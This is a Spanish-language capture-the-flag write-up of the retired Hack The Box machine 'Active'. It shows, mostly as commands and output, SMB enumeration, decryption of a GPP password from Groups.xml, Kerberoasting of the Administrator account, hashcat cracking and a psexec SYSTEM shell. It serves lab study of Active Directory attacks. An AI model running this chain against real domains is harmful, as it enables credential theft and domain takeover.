---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - AD
  - SMB
  - GPP
  - Kerberoasting
---
- [[#Reconocimiento|Reconocimiento]]
	- [[#Reconocimiento#Identificación del sistema|Identificación del sistema]]
	- [[#Reconocimiento#Escaneo de puertos|Escaneo de puertos]]
	- [[#Reconocimiento#Enumeración SMB (Anónima)|Enumeración SMB (Anónima)]]
	- [[#Reconocimiento#GPP Credentials|GPP Credentials]]
	- [[#Reconocimiento#Enumeración con credenciales|Enumeración con credenciales]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Ataque de Kerberoasting|Ataque de Kerberoasting]]
		- [[#Ataque de Kerberoasting#Enumeración de SPNs|Enumeración de SPNs]]
		- [[#Ataque de Kerberoasting#Extracción de TGS|Extracción de TGS]]
		- [[#Ataque de Kerberoasting#Crackeo de contraseñas|Crackeo de contraseñas]]
		- [[#Ataque de Kerberoasting#Acceso como Administrador|Acceso como Administrador]]

---
# Active

![](Screenshots/Pasted%20image%2020260419191302.png)

>Máquina retirada de Hack The Box llamada **[Active](https://app.hackthebox.com/machines/Active)**, que simula un entorno de Active Directory con un Domain Controller.  
>La explotación comienza con acceso anónimo a recursos SMB, donde se encuentran credenciales expuestas en un archivo de **Group Policy Preferences (GPP)**.  
>Con estas credenciales se obtiene acceso al dominio y se realiza un ataque de **Kerberoasting** para comprometer la cuenta de `Administrator`.  

---
## Enumeración
### Identificación del sistema

```PowerShell
ping -c 1 10.129.22.220
PING 10.129.22.220 (10.129.22.220) 56(84) bytes of data.
64 bytes from 10.129.22.220: icmp_seq=1 ttl=127 time=45.8 ms

--- 10.129.22.220 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.774/45.774/45.774/0.000 ms
```

Se trata de una máquina *Windows*.
### Escaneo de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.22.220 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49165/tcp open  unknown          syn-ack ttl 127
49171/tcp open  unknown          syn-ack ttl 127
49173/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49171,49173 -sCV 10.129.22.220 -oN targeted
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 11:27:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-19T11:28:12
|_  start_date: 2026-04-19T11:19:07
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
```

LDAP + Kerberos + SMB → *Domain Controler*

- Dominio: `active.htb`
- Host: `DC`
- OS: `Windows Server 2008 R2`

Se añade al archivo `/etc/hosts` el dominio: `10.129.22.220  active.htb`.
### Enumeración SMB (Anónima)

```PowerShell
smbmap -H 10.129.22.220
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.22.220:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections
```

El acceso de lectura al recurso `Replication` es especialmente relevante, ya que suele contener información replicada de **SYSVOL**, donde se almacenan políticas de dominio.

Este tipo de rutas es un objetivo habitual en entornos Active Directory, ya que pueden contener credenciales expuestas.
### GPP Credentials

**Group Policy Preferences (GPP):** almacena contraseñas cifradas reversibles.

Se explora el recurso en busca de configuraciones sensibles, centrándose en rutas típicas de políticas de dominio.

El archivo que nos interesa es `Groups.xml` en la ruta: `./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups`.

```XML
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
			<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
	</User>
</Groups>
```

Se desencripta la contraseña.

```PowerShell
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Se obtiene las credenciales: `active.htb\SVC_TGS:GPPstillStandingStrong2k18`.
### Enumeración con credenciales

Se comprueba que las credenciales sean correctas.

```PowerShell
crackmapexec smb 10.129.22.220 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'
SMB         10.129.22.220    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.22.220    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18
```

Se vuelve a enumerar el dominio.

```PowerShell
smbmap -H 10.129.22.220 -u SVC_TGS -p 'GPPstillStandingStrong2k18'
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.22.220:445       Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections  
```

Ahora, tenemos acceso a los directorios: `NETLOGON`, `SYSVOL` y `Users`.

La flag de `usuario` se encuentra en: `./Users//SVC_TGS/Desktop`.

---
## Explotación
### Kerberoasting
#### Enumeración de SPNs

```PowerShell
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-04-19 17:50:40.940968             
```
#### Extracción de TGS

```PowerShell
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
ervicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-04-19 17:50:40.940968             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8fd7ddd4cf41ebc5d8db66410c68a7f1$a1363ad67418bff247d5f360be9ef6c54412c752db5508b06235eb0e34acbc62385998f0f4f92c42524cf8148732b6715c0ee12b89e408e120c7c46961debf8846b6c69da012b0a263eb074bc858b4a50e511162fd78415576fcee792056a4a64639dbff1c1a6dd5624b6463a9fbfcb7a1ab29cdd3f9d019e97c08f650f001475ca86159b54cf6e5c84cb63608989a616b182fd2724115922135d1bdba7b46245107e26d065bc177c95817c9eecd5e7e44c1679ea09399e13c1a7d987e820aa8c90a1447e2aff29c0e67bc7906307d81deaa2364fbeb311653461dc656800d883d9cfbfdb8aac2a5c78195a4d5cfe701faf5849aafe074f62c9f2507eba8a530c56f11a67896b801ee29326f87b639af051a2608068fb41904e7354112921c622064c04be4561d31c706ffc104d4e84b61dfbf323b8ff9d9db17dba41835619d5bfa2ac78908e910f1abc72f20ba430053fd538fcc29c63e941dbb1f450222b2aeac75167ff1108df03d65333840c85785bc8714d4158149b3ce752ab18ec1daf70b70bd1821f003a20db64f9892953928f3f41ae82f470621599be97450407415be7347a7fad4b521e44d1552d6b1f36ae5ae856188f87c7447449ab22e00280665c39548038b16cea4904cf0afdbdffd5513f9e207e7096c218c96f70ccd1fbc986867bf2bb0b86ec0ac7001d00ad36395b6b4e3efb4f441f219f0845f86a4002daeab84a26eb6018c1b6e1f29cd4bdba578aec436af42bb8e36eaf4d44402874d6bb3ffb29489f5b778ececf75b0e18f3d556c58f6cf88499dea4c10ab3f0578a66a173489d96cdda1d3e9c699b7045eaff7ff38bfc8986724b644f0a6a05db788782de2fec05506d09d1c64f81878eb452b510158fb3c4d4607b4b448ca6e80b3aac1c5d382f8b5e66eb6f2fb0ed5595fd6ca41aa646ba7781d65c92695812d1f05688f7b1989d9329b606de3a15b6efdd8e54799212be8c91a739a70e304fd147cb882fc72a9c3d1eb8e6524a279948fc57e76fb2ea4b4df3076fe63368630981012c15b338f1fabb3ca4882b8895d8f8024b5cc6427c657698ac2a0700c26fe49ed755c79920b336b488a0c84ef0723fba6a1f9cd093cd06901991f1160e40e6a027822f725469fa6e382cbe7cca2a98436087abfcb7708375e2084bb6684ee136b8baf427b6e1d11733646f85833a8d6b136d509a50db78964ee7793a1f7b7cda4b4b8428af786a5301307b695d0f8baeef919ff9ab55
```
#### Crackeo de contraseñas

```PowerShell
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8fd7ddd4cf41ebc5d8db66410c68a7f1$a1363ad67418bff247d5f360be9ef6c54412c752db5508b06235eb0e34acbc62385998f0f4f92c42524cf8148732b6715c0ee12b89e408e120c7c46961debf8846b6c69da012b0a263eb074bc858b4a50e511162fd78415576fcee792056a4a64639dbff1c1a6dd5624b6463a9fbfcb7a1ab29cdd3f9d019e97c08f650f001475ca86159b54cf6e5c84cb63608989a616b182fd2724115922135d1bdba7b46245107e26d065bc177c95817c9eecd5e7e44c1679ea09399e13c1a7d987e820aa8c90a1447e2aff29c0e67bc7906307d81deaa2364fbeb311653461dc656800d883d9cfbfdb8aac2a5c78195a4d5cfe701faf5849aafe074f62c9f2507eba8a530c56f11a67896b801ee29326f87b639af051a2608068fb41904e7354112921c622064c04be4561d31c706ffc104d4e84b61dfbf323b8ff9d9db17dba41835619d5bfa2ac78908e910f1abc72f20ba430053fd538fcc29c63e941dbb1f450222b2aeac75167ff1108df03d65333840c85785bc8714d4158149b3ce752ab18ec1daf70b70bd1821f003a20db64f9892953928f3f41ae82f470621599be97450407415be7347a7fad4b521e44d1552d6b1f36ae5ae856188f87c7447449ab22e00280665c39548038b16cea4904cf0afdbdffd5513f9e207e7096c218c96f70ccd1fbc986867bf2bb0b86ec0ac7001d00ad36395b6b4e3efb4f441f219f0845f86a4002daeab84a26eb6018c1b6e1f29cd4bdba578aec436af42bb8e36eaf4d44402874d6bb3ffb29489f5b778ececf75b0e18f3d556c58f6cf88499dea4c10ab3f0578a66a173489d96cdda1d3e9c699b7045eaff7ff38bfc8986724b644f0a6a05db788782de2fec05506d09d1c64f81878eb452b510158fb3c4d4607b4b448ca6e80b3aac1c5d382f8b5e66eb6f2fb0ed5595fd6ca41aa646ba7781d65c92695812d1f05688f7b1989d9329b606de3a15b6efdd8e54799212be8c91a739a70e304fd147cb882fc72a9c3d1eb8e6524a279948fc57e76fb2ea4b4df3076fe63368630981012c15b338f1fabb3ca4882b8895d8f8024b5cc6427c657698ac2a0700c26fe49ed755c79920b336b488a0c84ef0723fba6a1f9cd093cd06901991f1160e40e6a027822f725469fa6e382cbe7cca2a98436087abfcb7708375e2084bb6684ee136b8baf427b6e1d11733646f85833a8d6b136d509a50db78964ee7793a1f7b7cda4b4b8428af786a5301307b695d0f8baeef919ff9ab55:Ticketmaster1968
```

Se obtienen las credenciales: `administrator:Ticketmaster1968`.
#### Acceso como Administrador

Se revisan que sean correctas.

```PowerShell
crackmapexec smb 10.129.22.220 -u 'administrator' -p 'Ticketmaster1968'
SMB         10.129.22.220    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.22.220    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
```

Se obtiene una terminal.

```PowerShell
impacket-psexec active.htb/administrator:Ticketmaster1968@10.129.22.220 cmd.exe
C:\Windows\system32> whoami
nt authority\system
```

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop\root.txt`.

---